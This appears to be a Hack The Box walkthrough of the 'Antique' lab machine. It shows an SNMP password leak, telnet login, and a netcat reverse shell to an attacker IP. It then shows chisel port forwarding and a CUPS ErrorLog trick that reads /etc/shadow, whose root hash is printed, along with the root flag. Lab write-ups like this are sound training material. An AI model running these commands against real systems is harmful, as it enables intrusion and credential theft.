# Antique 
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan | Identified an unusual service on port 23, which was identified as HP JetDirect telnet, and an SNMP service on UDP port 161. |
| 2 | (Local) | SNMP Walk | Used `snmpwalk` to query the SNMP service with the default community string `public`, and found a BITS array for an OID that looked like it contained a password. |
| 3 | lp | Password Decoding & Telnet Login | Decoded the hexadecimal BITS array to a cleartext password. Used this password to log in to the HP JetDirect telnet service, which gave a limited command shell as the `lp` user. |
| 4 | lp | Command Execution & Reverse Shell | Used the `exec` command available in the HP JetDirect shell to run a reverse shell payload, establishing a more functional shell on the target system. |
| 5 | lp | Local Enumeration | Used `netstat` to find services running on the local machine and discovered the CUPS service on port 631. |
| 6 | lp | Port Forwarding | Used `chisel` to forward the local CUPS port 631 on the target to a port on our attacking machine. This allowed us to access the CUPS web interface from our machine. |
| 7 | root | CUPS Arbitrary File Read | Exploited a known vulnerability in older CUPS versions that allows a user to change the `ErrorLog` file path using `cupsctl`. We set the `ErrorLog` to `/etc/shadow` and then to `/root/root.txt`, and retrieved the contents by making a `curl` request to the CUPS web interface. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270:
|     JetDirect
|     Password:
|   NULL:
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.91%I=7%D=10/7%Time=615EBCB8%P=x86_64-pc-linux-gnu%r(NULL
SF:,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPas
SF:sword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetReq
SF:uest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNS
SF:VersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatusR
SF:equestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerbe
SF:ros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20J
SF:etDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r
SF:(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalSe
SF:rver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,"
SF:\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirect
SF:\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20JetD
SF:irect\n\nPassword:\x20");
```
There is a running telnet service, if we do a banner grab using netcat, we can see:
```
[root@kali init-target (main ✗)]$ nc $TARGET 23                                          
HP JetDirect
```
As this is the only exposed service, we can start if there is any public exploit available using searchsploit
```
[root@kali htb-walkthroughs (main ✗)]$ searchsploit jetdirect                   
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
HP JetDirect FTP Print Server - 'RERT' Denial of Service                         | windows/dos/29787.py
HP JetDirect J3111A - Invalid FTP Command Denial of Service                      | hardware/dos/20090.txt
HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)              | unix/remote/45273.rb
HP JetDirect PJL - Interface Universal Directory Traversal (Metasploit)          | hardware/remote/17635.rb
HP JetDirect PJL - Query Execution (Metasploit)                                  | hardware/remote/17636.rb
HP JetDirect Printer - SNMP JetAdmin Device Password Disclosure                  | hardware/remote/22319.txt
HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification    | hardware/remote/20565.c
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
Let's focus on HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit) and Printer - SNMP JetAdmin Device Password Disclosure, let's mirror them both in the /exploit directory end examine them.

### HP Jetdirect - Path Traversal Arbitrary Code Execution (Metasploit)
Examining the [exploit blog](https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution and) seems like this exploit requires more open ports than one we have, lets check on metasploit.
```
msf6 exploit(linux/misc/hp_jetdirect_path_traversal) > show options

Module options (exploit/linux/misc/hp_jetdirect_path_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMUNITY  public           yes       SNMP Community String
   RETRIES    1                yes       SNMP Retries
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
                                         iki/Using-Metasploit
   RPORT      9100             yes       The target port (TCP)
   SNMPPORT   161              yes       The SNMP port
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an addres
                                         s on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TIMEOUT    1                yes       SNMP Timeout
   URIPATH                     no        The URI to use for this exploit (default is random)
   VERSION    1                yes       SNMP Version <1/2c>

```
We do not have any open port that responds to 9100 and 8080, so we should discard using this exploit as target is not exploitable.

### SNMP JetAdmin Device Password Disclosure
this exploit requires an open SNMP port, SNMP port is running on port 161 UDP, so we can scan for UDP ports using nmap.
```
Nmap scan report for 10.10.11.107
Host is up (0.049s latency).
Not shown: 998 closed ports
PORT     STATE         SERVICE VERSION
161/udp  open          snmp    SNMPv1 server (public)
2002/udp open|filtered globe
```
SNMP port is open so we can try to exploit this.  
Let's try a SNMP walk and then query for the OID specified in the vulnerability report.
```
[root@kali exploits ]$ snmpwalk -v 2c -c public $TARGET
iso.3.6.1.2.1 = STRING: "HTB Printer"
[root@kali exploits ]$ snmpwalk -v 2c -c public $TARGET .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```
BITS array represent the hex encoded password, let's try do decode it!
```
[root@kali exploits ]$ echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135" | xxd -r -p
P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i   IY�aA�"1&1A5#          
```
We got telnet passwor, so now we can login int telnet service gaining user access

## User
Now that we have the password for the telnet service we can login to the box, and run help

```
[root@kali ~ ]$ telnet $TARGET
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
```
as we can se, we can run system command using exec. So we can upload a reverse shell and gain access to the system,running:
```
> exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 4444 >/tmp/f
```
and here we obtain a shell ang user.txt

```
┌──(root💀kali)-[~]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.107] 33920
/bin/sh: 0: can't access tty; job control turned off
$ ls
telnet.py
user.txt
```

## Root
Having a foothold on the server, we start exploring the services that are running on the server.
```
lp@antique:~$ netstat . -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp        0    138 10.10.11.107:33968      10.10.14.28:4444        ESTABLISHED
tcp       10      0 10.10.11.107:23         10.10.14.28:35036       ESTABLISHED
tcp6       0      0 ::1:631                 :::*                    LISTEN     

```
There's a service running on port 361. This port is used by internet printing protocol by devault. Let's install chisel to do port forwarding
```
git clone https://github.com/jpillora/chisel
cd chisel && go build -ldflags="-s -w"
./chisel server -p8000--reverse
```
on the victin, launch the following command to forward the local port to the server listening on our client machine.
```
./chisel client 10.10.14.28:8000 R:631:127.0.0.1:631
```
Browsing to ``127.0.0.1:631`` on our machine shows CUPS administration page.  
CUPS versions less than 1.6.2 has a known local file read vulnerability. Navigate to Administration.  
Clicking on View Error Log shows the contents of error.log file. As CUPS server runs as root by default, arbitraty file read can be achieved by updating ErrorLog file path. Let's update the ErrorLog path using cupsctl.  
```
cupsctl ErrorLog="/etc/shadow"
```
Now sending a curl request to view error log page, reveals the content of /etc/shadow file (as well as root.txt).
```
lp@antique:~$ cupsctl ErrorLog="/etc/shadow"
lp@antique:~$ curl http://localhost:631/admin/log/error_log
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18891:0:99999:7:::
lp@antique:~$ cupsctl ErrorLog="/root/root.txt"
lp@antique:~$ curl http://localhost:631/admin/log/error_log
fa21719665a3e328f0935b246e83c027
```
